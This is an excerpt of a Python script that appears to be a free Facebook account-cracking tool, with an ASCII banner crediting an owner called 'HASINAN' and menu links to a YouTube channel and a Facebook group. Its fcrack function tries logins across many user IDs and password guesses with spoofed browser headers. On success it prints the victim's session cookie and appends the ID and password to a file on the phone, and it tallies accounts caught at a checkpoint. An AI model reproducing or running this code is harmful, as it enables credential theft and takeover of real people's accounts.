...
logo = """
db   db  .d8b.  .d8888. d8b   db  .d8b.  d888888b d8b   db 
88   88 d8' `8b 88'  YP 888o  88 d8' `8b   `88'   888o  88 
88ooo88 88ooo88 `8bo.   88V8o 88 88ooo88    88    88V8o 88 
88~~~88 88~~~88   `Y8b. 88 V8o88 88~~~88    88    88 V8o88 
88   88 88   88 db   8D 88  V888 88   88   .88.   88  V888 
YP   YP YP   YP `8888Y' VP   V8P YP   YP Y888888P VP   V8P
====================================================
[â€¢] OWNER      : HASINAN 
[â€¢] GITHUB     : Non Use 
[â€¢] STATUS     : FREE
...
def HUSINAN():
	...
	gh = input('[•] CHOOSE : ')
	if gh =='1':
		os.system("xdg-open https://www.youtube.com/@Quran_typist1/")
		menu()
	elif gh =='2':
		os.system("xdg-open https://facebook.com/groups/1079392916067208/")
		bd()
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=O1TsZVafWaL-h5uwWSruKg4M; sb=O1TsZRrSOHy6W3ez-KQ1zErT; ps_l=0; ps_n=0; m_pixel_ratio=3; wd=360x688; fr=0LfyoAoxwpltFFWsf..Bl7drM..AAA.0.0.Bl7dsv.AWWawjAAoyg',
    'dpr': '3',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HUSINAN-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/HUSINAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[HUSINAN-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('HUSINAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHUSINAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
